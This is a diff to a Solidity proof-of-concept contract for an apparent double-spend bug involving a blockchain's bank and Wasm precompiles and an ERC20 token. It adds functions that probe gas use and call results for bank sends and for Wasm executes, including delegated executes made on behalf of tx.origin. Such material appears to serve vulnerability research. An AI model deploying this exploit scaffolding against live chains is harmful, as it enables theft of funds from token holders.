@@ -150,6 +150,8 @@ contract BankXerc20DoubleSpendPoC {
 
     event WasmFundsGasProbe(uint256 gasBeforeCall, uint256 gasAfterCall);
     event WasmFundsCallResult(bool success, bytes returnData);
+    event BankSendGasProbe(uint256 gasBeforeCall, uint256 gasAfterCall);
+    event BankSendCallResult(bool success, bytes returnData);
 
     constructor(IERC20 token_, string memory denom_) {
         token = token_;
@@ -157,6 +159,21 @@ contract BankXerc20DoubleSpendPoC {
     }
 
     receive() external payable {}
+
+    function tryBankSend(
+        address recipient,
+        uint256 amount
+    ) external returns (bool success, bytes memory returnData) {
+        Coin[] memory coins = new Coin[](1);
+        coins[0] = Coin({denom: denom, amount: amount});
+
+        uint256 gasBeforeCall = gasleft();
+        (success, returnData) = BANK_PRECOMPILE_ADDRESS.call(
+            abi.encodeCall(IBank.send, (address(this), recipient, coins))
+        );
+        emit BankSendGasProbe(gasBeforeCall, gasleft());
+        emit BankSendCallResult(success, returnData);
+    }
 
     function exploit(
         address bankRecipient,
@@ -263,6 +280,43 @@ contract BankXerc20DoubleSpendPoC {
         uint256 amount
     ) external {
         _executeDelegateWasmFunds(wasmContract, wasmMsg, amount);
+    }
+
+    // No token call: exhaustion here belongs to the native Wasm execution.
+    function tryExecuteWasmSDKGas(
+        address wasmContract,
+        bool delegate,
+        uint256 gasBudget
+    ) external returns (bool success, bytes memory returnData) {
+        Coin[] memory funds = new Coin[](0);
+        bytes memory input = abi.encodeCall(
+            IWasm.executeContract,
+            (delegate ? tx.origin : address(this), wasmContract, bytes('{"increment":{}}'), funds)
+        );
+        address target = delegate ? WASM_DELEGATE_PRECOMPILE_ADDRESS : WASM_PRECOMPILE_ADDRESS;
+        uint256 gasBeforeCall = gasleft();
+        (success, returnData) = target.call{gas: gasBudget}(input);
+        emit WasmFundsGasProbe(gasBeforeCall, gasleft());
+        emit WasmFundsCallResult(success, returnData);
+    }
+
+    function tryExecuteDelegateWasmFunds(
+        address wasmContract,
+        bytes calldata wasmMsg,
+        uint256 amount
+    ) external returns (bool success, bytes memory returnData) {
+        Coin[] memory funds = new Coin[](1);
+        funds[0] = Coin({denom: denom, amount: amount});
+
+        uint256 gasBeforeCall = gasleft();
+        (success, returnData) = WASM_DELEGATE_PRECOMPILE_ADDRESS.call(
+            abi.encodeCall(
+                IWasm.executeContract,
+                (tx.origin, wasmContract, wasmMsg, funds)
+            )
+        );
+        emit WasmFundsGasProbe(gasBeforeCall, gasleft());
+        emit WasmFundsCallResult(success, returnData);
     }
 
     function executeDelegateWasmFundsThenRevert(
